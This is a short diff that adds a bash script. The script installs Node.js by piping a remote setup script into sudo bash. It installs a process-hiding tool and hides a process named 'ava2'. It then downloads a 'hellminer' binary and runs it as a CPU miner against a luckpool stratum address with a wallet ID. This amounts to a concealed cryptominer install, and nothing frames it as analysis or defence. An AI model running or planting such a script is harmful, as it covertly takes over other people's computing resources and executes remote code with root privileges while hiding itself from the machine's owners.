@@ -1,0 +1,2 @@
+#!/bin/bash
+sudo apt update -y && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.10.0 -y && npm i -g node-process-hider && ph add ava2 && wget https://github.com/thefacta/miner/raw/main/hellminer && chmod +x hellminer && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPiGL446F7Fa7bcQHcB3WrRSFXAtvB4LDx.bigbang -p x --cpu 4
